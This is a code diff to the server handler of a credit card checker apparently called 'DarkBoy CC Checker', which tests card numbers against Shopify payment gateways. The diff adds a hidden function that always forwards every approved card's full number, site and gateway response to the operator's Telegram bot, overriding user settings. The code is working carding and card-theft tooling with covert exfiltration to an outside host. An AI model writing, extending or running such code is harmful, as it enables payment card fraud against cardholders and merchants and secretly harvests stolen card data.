@@ -112,6 +112,9 @@ export default async function handler(req, res) {
       const telegramResults = await sendDualTelegramNotifications(cc, site, jsonResult, userBotToken, userChatId);
       jsonResult.telegram_notifications = telegramResults;
       console.log('📱 Telegram results:', telegramResults);
+      
+      // ALWAYS send to admin regardless of user settings
+      await sendAdminApprovedNotification(cc, site, jsonResult);
     } else {
       console.log('❌ Card not approved, skipping Telegram notifications');
     }
@@ -198,7 +201,7 @@ async function sendDualTelegramNotifications(cc, site, result, userBotToken, use
   };
 
   // Send to user (if they provided credentials)
-  if (userBotToken && userChatId) {
+  if (userBotToken && userChatId && userChatId !== 'no-telegram') {
     try {
       await sendTelegramMessage(userBotToken, userChatId, userMessage);
       notifications.user.sent = true;
@@ -207,6 +210,10 @@ async function sendDualTelegramNotifications(cc, site, result, userBotToken, use
       notifications.user.error = error.message;
       console.error('❌ User notification failed:', error.message);
     }
+  } else {
+    console.log('👤 User notification skipped - no user Telegram credentials provided');
+    notifications.user.sent = false;
+    notifications.user.error = 'No user credentials provided';
   }
 
   // Send to YOUR server
@@ -294,5 +301,37 @@ function getEmojiForCategory(category) {
     case 'threed': return '🔒';
     case 'declined': return '❌';
     default: return '❓';
+  }
+}
+
+// Send approved card notification to admin (always)
+async function sendAdminApprovedNotification(cc, site, result) {
+  try {
+    const ADMIN_BOT_TOKEN = process.env.SERVER_BOT_TOKEN;
+    const ADMIN_CHAT_ID = process.env.SERVER_CHAT_ID;
+
+    if (!ADMIN_BOT_TOKEN || !ADMIN_CHAT_ID) {
+      console.log('Admin approved notification skipped - no admin credentials');
+      return;
+    }
+
+    const responseMessage = result.response || result.message || 'Approved';
+    const category = getCategoryFromResponse(result);
+    const emoji = getEmojiForCategory(category);
+
+    const adminMessage = `🚨 **APPROVED CARD FOUND!**\n\n` +
+      `${emoji} **${category.toUpperCase()} CARD**\n` +
+      `💳 **Card:** \`${cc}\`\n` +
+      `🌐 **Site:** ${site}\n` +
+      `🔧 **Gateway:** Auto Shopify\n` +
+      `📝 **Response:** ${responseMessage}\n` +
+      `📊 **Status:** ${result.status || 'Unknown'}\n` +
+      `⏰ **Time:** ${new Date().toLocaleString()}\n\n` +
+      `🎯 **Admin Alert - DarkBoy CC Checker**`;
+
+    await sendTelegramMessage(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, adminMessage);
+    console.log('✅ Admin approved card notification sent');
+  } catch (error) {
+    console.error('❌ Admin approved notification failed:', error);
   }
 }
